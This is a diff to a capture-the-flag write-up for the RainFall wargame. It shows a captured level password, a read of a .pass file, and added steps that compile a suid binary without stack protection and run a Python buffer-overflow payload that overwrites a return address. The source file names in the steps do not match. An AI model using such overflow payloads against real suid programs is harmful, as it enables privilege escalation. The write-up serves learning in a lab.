@@ -71,3 +71,20 @@ cat /home/user/level2/.pass
 So the password for level2 is ```53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77```!
 
 ## Recreate Exploited Binary
+
+As user level2, create source_level0.c, then compile in /tmp/.
+```
+level2@RainFall: cd /tmp
+level2@RainFall: gcc source.c -fno-stack-protector -o source_level1
+```
+Edit permissions including suid, then move the binary to home directory.
+```
+level2@RainFall: chmod u+s source_level1
+level2@RainFall: chmod +wx ~; mv source_level1 ~
+```
+Exit back to user level1, then run the binary.
+```
+level2@RainFall:~$ exit
+exit
+level1@RainFall:~$ (python -c 'print "a"*76 + "\x44\x84\x04\x08"'; cat) | /home/user/level1/source_level1
+```
